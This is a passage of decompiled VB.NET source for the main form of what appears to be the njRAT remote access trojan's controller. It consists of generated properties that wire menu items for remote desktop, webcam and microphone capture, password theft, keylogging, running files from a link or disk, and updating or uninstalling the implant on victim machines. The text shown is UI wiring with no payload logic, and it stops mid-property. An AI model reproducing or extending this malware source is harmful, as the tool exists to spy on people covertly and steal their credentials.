Imports System
Imports System.Collections
Imports System.Collections.Generic
Imports System.ComponentModel
Imports System.Diagnostics
Imports System.Drawing
Imports System.IO
Imports System.Runtime.CompilerServices
Imports System.Threading
Imports System.Windows.Forms
Imports Microsoft.VisualBasic
Imports Microsoft.VisualBasic.CompilerServices
Imports NJRAT.My
Imports NJRAT.njRAT
Imports WinMM

Namespace NJRAT
	' Token: 0x02000011 RID: 17
	<DesignerGenerated()>
	Public Partial Class Form1
		Inherits Form

		' Token: 0x06000167 RID: 359 RVA: 0x00152A98 File Offset: 0x00150E98
		<DebuggerNonUserCode()>
		Private Shared Sub __ENCAddToList(value As Object)
			Dim _ENCList As List(Of WeakReference) = Form1.__ENCList
			SyncLock _ENCList
				Dim flag As Boolean = Form1.__ENCList.Count = Form1.__ENCList.Capacity
				If flag Then
					Dim num As Integer = 0
					Dim num2 As Integer = 0
					Dim num3 As Integer = Form1.__ENCList.Count - 1
					Dim num4 As Integer = num2
					While True
						Dim num5 As Integer = num4
						Dim num6 As Integer = num3
						If num5 > num6 Then
							Exit For
						End If
						Dim weakReference As WeakReference = Form1.__ENCList(num4)
						flag = weakReference.IsAlive
						If flag Then
							Dim flag2 As Boolean = num4 <> num
							If flag2 Then
								Form1.__ENCList(num) = Form1.__ENCList(num4)
							End If
							num += 1
						End If
						num4 += 1
					End While
					Form1.__ENCList.RemoveRange(num, Form1.__ENCList.Count - num)
					Form1.__ENCList.Capacity = Form1.__ENCList.Count
				End If
				Form1.__ENCList.Add(New WeakReference(RuntimeHelpers.GetObjectValue(value)))
			End SyncLock
		End Sub

		' Token: 0x17000082 RID: 130
		' (get) Token: 0x0600016A RID: 362 RVA: 0x00156254 File Offset: 0x00154654
		' (set) Token: 0x0600016B RID: 363 RVA: 0x0015626C File Offset: 0x0015466C
		Friend Overridable Property StatusStrip1 As StatusStrip
			<DebuggerNonUserCode()>
			Get
				Return Me._StatusStrip1
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As StatusStrip)
				Me._StatusStrip1 = value
			End Set
		End Property

		' Token: 0x17000083 RID: 131
		' (get) Token: 0x0600016C RID: 364 RVA: 0x00156278 File Offset: 0x00154678
		' (set) Token: 0x0600016D RID: 365 RVA: 0x00156290 File Offset: 0x00154690
		Friend Overridable Property ToolStripStatusLabel1 As ToolStripStatusLabel
			<DebuggerNonUserCode()>
			Get
				Return Me._ToolStripStatusLabel1
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ToolStripStatusLabel)
				Dim value2 As EventHandler = AddressOf Me.ToolStripStatusLabel1_Click
				Dim flag As Boolean = Me._ToolStripStatusLabel1 IsNot Nothing
				If flag Then
					RemoveHandler Me._ToolStripStatusLabel1.Click, value2
				End If
				Me._ToolStripStatusLabel1 = value
				flag = (Me._ToolStripStatusLabel1 IsNot Nothing)
				If flag Then
					AddHandler Me._ToolStripStatusLabel1.Click, value2
				End If
			End Set
		End Property

		' Token: 0x17000084 RID: 132
		' (get) Token: 0x0600016E RID: 366 RVA: 0x001562F0 File Offset: 0x001546F0
		' (set) Token: 0x0600016F RID: 367 RVA: 0x00156308 File Offset: 0x00154708
		Friend Overridable Property ToolStripStatusLabel3 As ToolStripStatusLabel
			<DebuggerNonUserCode()>
			Get
				Return Me._ToolStripStatusLabel3
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ToolStripStatusLabel)
				Dim value2 As EventHandler = AddressOf Me.ToolStripStatusLabel3_Click
				Dim flag As Boolean = Me._ToolStripStatusLabel3 IsNot Nothing
				If flag Then
					RemoveHandler Me._ToolStripStatusLabel3.Click, value2
				End If
				Me._ToolStripStatusLabel3 = value
				flag = (Me._ToolStripStatusLabel3 IsNot Nothing)
				If flag Then
					AddHandler Me._ToolStripStatusLabel3.Click, value2
				End If
			End Set
		End Property

		' Token: 0x17000085 RID: 133
		' (get) Token: 0x06000170 RID: 368 RVA: 0x00156368 File Offset: 0x00154768
		' (set) Token: 0x06000171 RID: 369 RVA: 0x00156380 File Offset: 0x00154780
		Friend Overridable Property ToolStripStatusLabel5 As ToolStripStatusLabel
			<DebuggerNonUserCode()>
			Get
				Return Me._ToolStripStatusLabel5
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ToolStripStatusLabel)
				Dim value2 As EventHandler = AddressOf Me.ToolStripStatusLabel5_Click
				Dim flag As Boolean = Me._ToolStripStatusLabel5 IsNot Nothing
				If flag Then
					RemoveHandler Me._ToolStripStatusLabel5.Click, value2
				End If
				Me._ToolStripStatusLabel5 = value
				flag = (Me._ToolStripStatusLabel5 IsNot Nothing)
				If flag Then
					AddHandler Me._ToolStripStatusLabel5.Click, value2
				End If
			End Set
		End Property

		' Token: 0x17000086 RID: 134
		' (get) Token: 0x06000172 RID: 370 RVA: 0x001563E0 File Offset: 0x001547E0
		' (set) Token: 0x06000173 RID: 371 RVA: 0x001563F8 File Offset: 0x001547F8
		Friend Overridable Property ToolStripStatusLabel4 As ToolStripStatusLabel
			<DebuggerNonUserCode()>
			Get
				Return Me._ToolStripStatusLabel4
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ToolStripStatusLabel)
				Dim value2 As EventHandler = AddressOf Me.ToolStripStatusLabel4_Click
				Dim flag As Boolean = Me._ToolStripStatusLabel4 IsNot Nothing
				If flag Then
					RemoveHandler Me._ToolStripStatusLabel4.Click, value2
				End If
				Me._ToolStripStatusLabel4 = value
				flag = (Me._ToolStripStatusLabel4 IsNot Nothing)
				If flag Then
					AddHandler Me._ToolStripStatusLabel4.Click, value2
				End If
			End Set
		End Property

		' Token: 0x17000087 RID: 135
		' (get) Token: 0x06000174 RID: 372 RVA: 0x00156458 File Offset: 0x00154858
		' (set) Token: 0x06000175 RID: 373 RVA: 0x00156470 File Offset: 0x00154870
		Friend Overridable Property conz As ToolStripStatusLabel
			<DebuggerNonUserCode()>
			Get
				Return Me._conz
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ToolStripStatusLabel)
				Me._conz = value
			End Set
		End Property

		' Token: 0x17000088 RID: 136
		' (get) Token: 0x06000176 RID: 374 RVA: 0x0015647C File Offset: 0x0015487C
		' (set) Token: 0x06000177 RID: 375 RVA: 0x00156494 File Offset: 0x00154894
		Friend Overridable Property upl As ToolStripStatusLabel
			<DebuggerNonUserCode()>
			Get
				Return Me._upl
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ToolStripStatusLabel)
				Me._upl = value
			End Set
		End Property

		' Token: 0x17000089 RID: 137
		' (get) Token: 0x06000178 RID: 376 RVA: 0x001564A0 File Offset: 0x001548A0
		' (set) Token: 0x06000179 RID: 377 RVA: 0x001564B8 File Offset: 0x001548B8
		Friend Overridable Property dwn As ToolStripStatusLabel
			<DebuggerNonUserCode()>
			Get
				Return Me._dwn
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ToolStripStatusLabel)
				Me._dwn = value
			End Set
		End Property

		' Token: 0x1700008A RID: 138
		' (get) Token: 0x0600017A RID: 378 RVA: 0x001564C4 File Offset: 0x001548C4
		' (set) Token: 0x0600017B RID: 379 RVA: 0x001564DC File Offset: 0x001548DC
		Friend Overridable Property ContextMenuStrip1 As ContextMenuStrip
			<DebuggerNonUserCode()>
			Get
				Return Me._ContextMenuStrip1
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ContextMenuStrip)
				Me._ContextMenuStrip1 = value
			End Set
		End Property

		' Token: 0x1700008B RID: 139
		' (get) Token: 0x0600017C RID: 380 RVA: 0x001564E8 File Offset: 0x001548E8
		' (set) Token: 0x0600017D RID: 381 RVA: 0x00156500 File Offset: 0x00154900
		Friend Overridable Property ManagerToolStripMenuItem As ToolStripMenuItem
			<DebuggerNonUserCode()>
			Get
				Return Me._ManagerToolStripMenuItem
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ToolStripMenuItem)
				Dim value2 As EventHandler = AddressOf Me.ManagerToolStripMenuItem_Click
				Dim flag As Boolean = Me._ManagerToolStripMenuItem IsNot Nothing
				If flag Then
					RemoveHandler Me._ManagerToolStripMenuItem.Click, value2
				End If
				Me._ManagerToolStripMenuItem = value
				flag = (Me._ManagerToolStripMenuItem IsNot Nothing)
				If flag Then
					AddHandler Me._ManagerToolStripMenuItem.Click, value2
				End If
			End Set
		End Property

		' Token: 0x1700008C RID: 140
		' (get) Token: 0x0600017E RID: 382 RVA: 0x00156560 File Offset: 0x00154960
		' (set) Token: 0x0600017F RID: 383 RVA: 0x00156578 File Offset: 0x00154978
		Friend Overridable Property RunFileToolStripMenuItem As ToolStripMenuItem
			<DebuggerNonUserCode()>
			Get
				Return Me._RunFileToolStripMenuItem
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ToolStripMenuItem)
				Me._RunFileToolStripMenuItem = value
			End Set
		End Property

		' Token: 0x1700008D RID: 141
		' (get) Token: 0x06000180 RID: 384 RVA: 0x00156584 File Offset: 0x00154984
		' (set) Token: 0x06000181 RID: 385 RVA: 0x0015659C File Offset: 0x0015499C
		Friend Overridable Property FromLinkToolStripMenuItem As ToolStripMenuItem
			<DebuggerNonUserCode()>
			Get
				Return Me._FromLinkToolStripMenuItem
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ToolStripMenuItem)
				Dim value2 As EventHandler = AddressOf Me.FromLinkToolStripMenuItem_Click
				Dim flag As Boolean = Me._FromLinkToolStripMenuItem IsNot Nothing
				If flag Then
					RemoveHandler Me._FromLinkToolStripMenuItem.Click, value2
				End If
				Me._FromLinkToolStripMenuItem = value
				flag = (Me._FromLinkToolStripMenuItem IsNot Nothing)
				If flag Then
					AddHandler Me._FromLinkToolStripMenuItem.Click, value2
				End If
			End Set
		End Property

		' Token: 0x1700008E RID: 142
		' (get) Token: 0x06000182 RID: 386 RVA: 0x001565FC File Offset: 0x001549FC
		' (set) Token: 0x06000183 RID: 387 RVA: 0x00156614 File Offset: 0x00154A14
		Friend Overridable Property FromDiskToolStripMenuItem As ToolStripMenuItem
			<DebuggerNonUserCode()>
			Get
				Return Me._FromDiskToolStripMenuItem
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ToolStripMenuItem)
				Dim value2 As EventHandler = AddressOf Me.FromDiskToolStripMenuItem_Click
				Dim flag As Boolean = Me._FromDiskToolStripMenuItem IsNot Nothing
				If flag Then
					RemoveHandler Me._FromDiskToolStripMenuItem.Click, value2
				End If
				Me._FromDiskToolStripMenuItem = value
				flag = (Me._FromDiskToolStripMenuItem IsNot Nothing)
				If flag Then
					AddHandler Me._FromDiskToolStripMenuItem.Click, value2
				End If
			End Set
		End Property

		' Token: 0x1700008F RID: 143
		' (get) Token: 0x06000184 RID: 388 RVA: 0x00156674 File Offset: 0x00154A74
		' (set) Token: 0x06000185 RID: 389 RVA: 0x0015668C File Offset: 0x00154A8C
		Friend Overridable Property ScriptToolStripMenuItem As ToolStripMenuItem
			<DebuggerNonUserCode()>
			Get
				Return Me._ScriptToolStripMenuItem
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ToolStripMenuItem)
				Dim value2 As EventHandler = AddressOf Me.ScriptToolStripMenuItem_Click
				Dim flag As Boolean = Me._ScriptToolStripMenuItem IsNot Nothing
				If flag Then
					RemoveHandler Me._ScriptToolStripMenuItem.Click, value2
				End If
				Me._ScriptToolStripMenuItem = value
				flag = (Me._ScriptToolStripMenuItem IsNot Nothing)
				If flag Then
					AddHandler Me._ScriptToolStripMenuItem.Click, value2
				End If
			End Set
		End Property

		' Token: 0x17000090 RID: 144
		' (get) Token: 0x06000186 RID: 390 RVA: 0x001566EC File Offset: 0x00154AEC
		' (set) Token: 0x06000187 RID: 391 RVA: 0x00156704 File Offset: 0x00154B04
		Friend Overridable Property RemoteDesktopToolStripMenuItem As ToolStripMenuItem
			<DebuggerNonUserCode()>
			Get
				Return Me._RemoteDesktopToolStripMenuItem
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ToolStripMenuItem)
				Dim value2 As EventHandler = AddressOf Me.RemoteDesktopToolStripMenuItem_Click
				Dim flag As Boolean = Me._RemoteDesktopToolStripMenuItem IsNot Nothing
				If flag Then
					RemoveHandler Me._RemoteDesktopToolStripMenuItem.Click, value2
				End If
				Me._RemoteDesktopToolStripMenuItem = value
				flag = (Me._RemoteDesktopToolStripMenuItem IsNot Nothing)
				If flag Then
					AddHandler Me._RemoteDesktopToolStripMenuItem.Click, value2
				End If
			End Set
		End Property

		' Token: 0x17000091 RID: 145
		' (get) Token: 0x06000188 RID: 392 RVA: 0x00156764 File Offset: 0x00154B64
		' (set) Token: 0x06000189 RID: 393 RVA: 0x0015677C File Offset: 0x00154B7C
		Friend Overridable Property RemoteCamToolStripMenuItem As ToolStripMenuItem
			<DebuggerNonUserCode()>
			Get
				Return Me._RemoteCamToolStripMenuItem
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ToolStripMenuItem)
				Dim value2 As EventHandler = AddressOf Me.RemoteCamToolStripMenuItem_Click
				Dim flag As Boolean = Me._RemoteCamToolStripMenuItem IsNot Nothing
				If flag Then
					RemoveHandler Me._RemoteCamToolStripMenuItem.Click, value2
				End If
				Me._RemoteCamToolStripMenuItem = value
				flag = (Me._RemoteCamToolStripMenuItem IsNot Nothing)
				If flag Then
					AddHandler Me._RemoteCamToolStripMenuItem.Click, value2
				End If
			End Set
		End Property

		' Token: 0x17000092 RID: 146
		' (get) Token: 0x0600018A RID: 394 RVA: 0x001567DC File Offset: 0x00154BDC
		' (set) Token: 0x0600018B RID: 395 RVA: 0x001567F4 File Offset: 0x00154BF4
		Friend Overridable Property MicrophoneToolStripMenuItem As ToolStripMenuItem
			<DebuggerNonUserCode()>
			Get
				Return Me._MicrophoneToolStripMenuItem
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ToolStripMenuItem)
				Dim value2 As EventHandler = AddressOf Me.MicrophoneToolStripMenuItem_Click
				Dim flag As Boolean = Me._MicrophoneToolStripMenuItem IsNot Nothing
				If flag Then
					RemoveHandler Me._MicrophoneToolStripMenuItem.Click, value2
				End If
				Me._MicrophoneToolStripMenuItem = value
				flag = (Me._MicrophoneToolStripMenuItem IsNot Nothing)
				If flag Then
					AddHandler Me._MicrophoneToolStripMenuItem.Click, value2
				End If
			End Set
		End Property

		' Token: 0x17000093 RID: 147
		' (get) Token: 0x0600018C RID: 396 RVA: 0x00156854 File Offset: 0x00154C54
		' (set) Token: 0x0600018D RID: 397 RVA: 0x0015686C File Offset: 0x00154C6C
		Friend Overridable Property GetPasswordsToolStripMenuItem As ToolStripMenuItem
			<DebuggerNonUserCode()>
			Get
				Return Me._GetPasswordsToolStripMenuItem
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ToolStripMenuItem)
				Me._GetPasswordsToolStripMenuItem = value
			End Set
		End Property

		' Token: 0x17000094 RID: 148
		' (get) Token: 0x0600018E RID: 398 RVA: 0x00156878 File Offset: 0x00154C78
		' (set) Token: 0x0600018F RID: 399 RVA: 0x00156890 File Offset: 0x00154C90
		Friend Overridable Property KeyloggerToolStripMenuItem As ToolStripMenuItem
			<DebuggerNonUserCode()>
			Get
				Return Me._KeyloggerToolStripMenuItem
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ToolStripMenuItem)
				Dim value2 As EventHandler = AddressOf Me.KeyloggerToolStripMenuItem_Click
				Dim flag As Boolean = Me._KeyloggerToolStripMenuItem IsNot Nothing
				If flag Then
					RemoveHandler Me._KeyloggerToolStripMenuItem.Click, value2
				End If
				Me._KeyloggerToolStripMenuItem = value
				flag = (Me._KeyloggerToolStripMenuItem IsNot Nothing)
				If flag Then
					AddHandler Me._KeyloggerToolStripMenuItem.Click, value2
				End If
			End Set
		End Property

		' Token: 0x17000095 RID: 149
		' (get) Token: 0x06000190 RID: 400 RVA: 0x001568F0 File Offset: 0x00154CF0
		' (set) Token: 0x06000191 RID: 401 RVA: 0x00156908 File Offset: 0x00154D08
		Friend Overridable Property OpenChatToolStripMenuItem As ToolStripMenuItem
			<DebuggerNonUserCode()>
			Get
				Return Me._OpenChatToolStripMenuItem
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ToolStripMenuItem)
				Dim value2 As EventHandler = AddressOf Me.OpenChatToolStripMenuItem_Click
				Dim flag As Boolean = Me._OpenChatToolStripMenuItem IsNot Nothing
				If flag Then
					RemoveHandler Me._OpenChatToolStripMenuItem.Click, value2
				End If
				Me._OpenChatToolStripMenuItem = value
				flag = (Me._OpenChatToolStripMenuItem IsNot Nothing)
				If flag Then
					AddHandler Me._OpenChatToolStripMenuItem.Click, value2
				End If
			End Set
		End Property

		' Token: 0x17000096 RID: 150
		' (get) Token: 0x06000192 RID: 402 RVA: 0x00156968 File Offset: 0x00154D68
		' (set) Token: 0x06000193 RID: 403 RVA: 0x00156980 File Offset: 0x00154D80
		Friend Overridable Property ServerToolStripMenuItem As ToolStripMenuItem
			<DebuggerNonUserCode()>
			Get
				Return Me._ServerToolStripMenuItem
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ToolStripMenuItem)
				Me._ServerToolStripMenuItem = value
			End Set
		End Property

		' Token: 0x17000097 RID: 151
		' (get) Token: 0x06000194 RID: 404 RVA: 0x0015698C File Offset: 0x00154D8C
		' (set) Token: 0x06000195 RID: 405 RVA: 0x001569A4 File Offset: 0x00154DA4
		Friend Overridable Property UpdateToolStripMenuItem As ToolStripMenuItem
			<DebuggerNonUserCode()>
			Get
				Return Me._UpdateToolStripMenuItem
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ToolStripMenuItem)
				Me._UpdateToolStripMenuItem = value
			End Set
		End Property

		' Token: 0x17000098 RID: 152
		' (get) Token: 0x06000196 RID: 406 RVA: 0x001569B0 File Offset: 0x00154DB0
		' (set) Token: 0x06000197 RID: 407 RVA: 0x001569C8 File Offset: 0x00154DC8
		Friend Overridable Property FromDISKToolStripMenuItem1 As ToolStripMenuItem
			<DebuggerNonUserCode()>
			Get
				Return Me._FromDISKToolStripMenuItem1
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ToolStripMenuItem)
				Dim value2 As EventHandler = AddressOf Me.FromDISKToolStripMenuItem1_Click
				Dim flag As Boolean = Me._FromDISKToolStripMenuItem1 IsNot Nothing
				If flag Then
					RemoveHandler Me._FromDISKToolStripMenuItem1.Click, value2
				End If
				Me._FromDISKToolStripMenuItem1 = value
				flag = (Me._FromDISKToolStripMenuItem1 IsNot Nothing)
				If flag Then
					AddHandler Me._FromDISKToolStripMenuItem1.Click, value2
				End If
			End Set
		End Property

		' Token: 0x17000099 RID: 153
		' (get) Token: 0x06000198 RID: 408 RVA: 0x00156A28 File Offset: 0x00154E28
		' (set) Token: 0x06000199 RID: 409 RVA: 0x00156A40 File Offset: 0x00154E40
		Friend Overridable Property FromLINKToolStripMenuItem1 As ToolStripMenuItem
			<DebuggerNonUserCode()>
			Get
				Return Me._FromLINKToolStripMenuItem1
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ToolStripMenuItem)
				Dim value2 As EventHandler = AddressOf Me.FromLINKToolStripMenuItem1_Click
				Dim flag As Boolean = Me._FromLINKToolStripMenuItem1 IsNot Nothing
				If flag Then
					RemoveHandler Me._FromLINKToolStripMenuItem1.Click, value2
				End If
				Me._FromLINKToolStripMenuItem1 = value
				flag = (Me._FromLINKToolStripMenuItem1 IsNot Nothing)
				If flag Then
					AddHandler Me._FromLINKToolStripMenuItem1.Click, value2
				End If
			End Set
		End Property

		' Token: 0x1700009A RID: 154
		' (get) Token: 0x0600019A RID: 410 RVA: 0x00156AA0 File Offset: 0x00154EA0
		' (set) Token: 0x0600019B RID: 411 RVA: 0x00156AB8 File Offset: 0x00154EB8
		Friend Overridable Property UninstallToolStripMenuItem As ToolStripMenuItem
			<DebuggerNonUserCode()>
			Get
				Return Me._UninstallToolStripMenuItem
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ToolStripMenuItem)
				Dim value2 As EventHandler = AddressOf Me.UninstallToolStripMenuItem_Click
				Dim flag As Boolean = Me._UninstallToolStripMenuItem IsNot Nothing
				If flag Then
					RemoveHandler Me._UninstallToolStripMenuItem.Click, value2
				End If
				Me._UninstallToolStripMenuItem = value
				flag = (Me._UninstallToolStripMenuItem IsNot Nothing)
				If flag Then
					AddHandler Me._UninstallToolStripMenuItem.Click, value2
				End If
			End Set
		End Property

		' Token: 0x1700009B RID: 155
		' (get) Token: 0x0600019C RID: 412 RVA: 0x00156B18 File Offset: 0x00154F18
		' (set) Token: 0x0600019D RID: 413 RVA: 0x00156B30 File Offset: 0x00154F30
		Friend Overridable Property RestartToolStripMenuItem As ToolStripMenuItem
			<DebuggerNonUserCode()>
			Get
				Return Me._RestartToolStripMenuItem
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ToolStripMenuItem)
				Dim value2 As EventHandler = AddressOf Me.RestartToolStripMenuItem_Click
				Dim flag As Boolean = Me._RestartToolStripMenuItem IsNot Nothing
				If flag Then
					RemoveHandler Me._RestartToolStripMenuItem.Click, value2
				End If
				Me._RestartToolStripMenuItem = value
				flag = (Me._RestartToolStripMenuItem IsNot Nothing)
				If flag Then
					AddHandler Me._RestartToolStripMenuItem.Click, value2
				End If
			End Set
		End Property

		' Token: 0x1700009C RID: 156
		' (get) Token: 0x0600019E RID: 414 RVA: 0x00156B90 File Offset: 0x00154F90
		' (set) Token: 0x0600019F RID: 415 RVA: 0x00156BA8 File Offset: 0x00154FA8
		Friend Overridable Property CloseToolStripMenuItem As ToolStripMenuItem
			<DebuggerNonUserCode()>
			Get
				Return Me._CloseToolStripMenuItem
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ToolStripMenuItem)
				Dim value2 As EventHandler = AddressOf Me.CloseToolStripMenuItem_Click
				Dim flag As Boolean = Me._CloseToolStripMenuItem IsNot Nothing
				If flag Then
					RemoveHandler Me._CloseToolStripMenuItem.Click, value2
				End If
				Me._CloseToolStripMenuItem = value
				flag = (Me._CloseToolStripMenuItem IsNot Nothing)
				If flag Then
					AddHandler Me._CloseToolStripMenuItem.Click, value2
				End If
			End Set
		End Property

		' Token: 0x1700009D RID: 157
		' (get) Token: 0x060001A0 RID: 416 RVA: 0x00156C08 File Offset: 0x00155008
		' (set) Token: 0x060001A1 RID: 417 RVA: 0x00156C20 File Offset: 0x00155020
		Friend Overridable Property DisconnectToolStripMenuItem As ToolStripMenuItem
			<DebuggerNonUserCode()>
			Get
				Return Me._DisconnectToolStripMenuItem
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ToolStripMenuItem)
				Dim value2 As EventHandler = AddressOf Me.DisconnectToolStripMenuItem_Click
				Dim flag As Boolean = Me._DisconnectToolStripMenuItem IsNot Nothing
				If flag Then
					RemoveHandler Me._DisconnectToolStripMenuItem.Click, value2
				End If
				Me._DisconnectToolStripMenuItem = value
				flag = (Me._DisconnectToolStripMenuItem IsNot Nothing)
				If flag Then
					AddHandler Me._DisconnectToolStripMenuItem.Click, value2
				End If
			End Set
		End Property

		' Token: 0x1700009E RID: 158
		' (get) Token: 0x060001A2 RID: 418 RVA: 0x00156C80 File Offset: 0x00155080
		' (set) Token: 0x060001A3 RID: 419 RVA: 0x00156C98 File Offset: 0x00155098
		Friend Overridable Property RenameToolStripMenuItem As ToolStripMenuItem
			<DebuggerNonUserCode()>
			Get
				Return Me._RenameToolStripMenuItem
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ToolStripMenuItem)
				Dim value2 As EventHandler = AddressOf Me.RenameToolStripMenuItem_Click
				Dim flag As Boolean = Me._RenameToolStripMenuItem IsNot Nothing
				If flag Then
					RemoveHandler Me._RenameToolStripMenuItem.Click, value2
				End If
				Me._RenameToolStripMenuItem = value
				flag = (Me._RenameToolStripMenuItem IsNot Nothing)
				If flag Then
					AddHandler Me._RenameToolStripMenuItem.Click, value2
				End If
			End Set
		End Property

		' Token: 0x1700009F RID: 159
		' (get) Token: 0x060001A4 RID: 420 RVA: 0x00156CF8 File Offset: 0x001550F8
		' (set) Token: 0x060001A5 RID: 421 RVA: 0x00156D10 File Offset: 0x00155110
		Friend Overridable Property OpenFolderToolStripMenuItem As ToolStripMenuItem
			<DebuggerNonUserCode()>
			Get
				Return Me._OpenFolderToolStripMenuItem
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ToolStripMenuItem)
				Dim value2 As EventHandler = AddressOf Me.OpenFolderToolStripMenuItem_Click
				Dim flag As Boolean = Me._OpenFolderToolStripMenuItem IsNot Nothing
				If flag Then
					RemoveHandler Me._OpenFolderToolStripMenuItem.Click, value2
				End If
				Me._OpenFolderToolStripMenuItem = value
				flag = (Me._OpenFolderToolStripMenuItem IsNot Nothing)
				If flag Then
					AddHandler Me._OpenFolderToolStripMenuItem.Click, value2
				End If
			End Set
		End Property

		' Token: 0x170000A0 RID: 160
		' (get) Token: 0x060001A6 RID: 422 RVA: 0x00156D70 File Offset: 0x00155170
		' (set) Token: 0x060001A7 RID: 423 RVA: 0x00156D88 File Offset: 0x00155188
		Friend Overridable Property IMG2 As ImageList
			<DebuggerNonUserCode()>
			Get
				Return Me._IMG2
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ImageList)
				Me._IMG2 = value
			End Set
		End Property

		' Token: 0x170000A1 RID: 161
		' (get) Token: 0x060001A8 RID: 424 RVA: 0x00156D94 File Offset: 0x00155194
		' (set) Token: 0x060001A9 RID: 425 RVA: 0x00156DAC File Offset: 0x001551AC
		Friend Overridable Property NotifyIcon1 As NotifyIcon
			<DebuggerNonUserCode()>
			Get
				Return Me._NotifyIcon1
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As NotifyIcon)
				Dim value2 As MouseEventHandler = AddressOf Me.NotifyIcon1_MouseDoubleClick
				Dim flag As Boolean = Me._NotifyIcon1 IsNot Nothing
				If flag Then
					RemoveHandler Me._NotifyIcon1.MouseDoubleClick, value2
				End If
				Me._NotifyIcon1 = value
				flag = (Me._NotifyIcon1 IsNot Nothing)
				If flag Then
					AddHandler Me._NotifyIcon1.MouseDoubleClick, value2
				End If
			End Set
		End Property

		' Token: 0x170000A2 RID: 162
		' (get) Token: 0x060001AA RID: 426 RVA: 0x00156E0C File Offset: 0x0015520C
		' (set) Token: 0x060001AB RID: 427 RVA: 0x00156E24 File Offset: 0x00155224
		Friend Overridable Property L1 As L1
			<DebuggerNonUserCode()>
			Get
				Return Me._L1
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As L1)
				Dim value2 As DataGridViewColumnEventHandler = AddressOf Me.L1_ColumnWidthChanged
				Dim flag As Boolean = Me._L1 IsNot Nothing
				If flag Then
					RemoveHandler Me._L1.ColumnWidthChanged, value2
				End If
				Me._L1 = value
				flag = (Me._L1 IsNot Nothing)
				If flag Then
					AddHandler Me._L1.ColumnWidthChanged, value2
				End If
			End Set
		End Property

		' Token: 0x170000A3 RID: 163
		' (get) Token: 0x060001AC RID: 428 RVA: 0x00156E84 File Offset: 0x00155284
		' (set) Token: 0x060001AD RID: 429 RVA: 0x00156E9C File Offset: 0x0015529C
		Friend Overridable Property Pp1 As Pp1
			<DebuggerNonUserCode()>
			Get
				Return Me._Pp1
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As Pp1)
				Me._Pp1 = value
			End Set
		End Property

		' Token: 0x170000A4 RID: 164
		' (get) Token: 0x060001AE RID: 430 RVA: 0x00156EA8 File Offset: 0x001552A8
		' (set) Token: 0x060001AF RID: 431 RVA: 0x00156EC0 File Offset: 0x001552C0
		Friend Overridable Property Timer1 As System.Windows.Forms.Timer
			<DebuggerNonUserCode()>
			Get
				Return Me._Timer1
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As System.Windows.Forms.Timer)
				Dim value2 As EventHandler = AddressOf Me.Timer1_Tick
				Dim flag As Boolean = Me._Timer1 IsNot Nothing
				If flag Then
					RemoveHandler Me._Timer1.Tick, value2
				End If
				Me._Timer1 = value
				flag = (Me._Timer1 IsNot Nothing)
				If flag Then
					AddHandler Me._Timer1.Tick, value2
				End If
			End Set
		End Property

		' Token: 0x170000A5 RID: 165
		' (get) Token: 0x060001B0 RID: 432 RVA: 0x00156F20 File Offset: 0x00155320
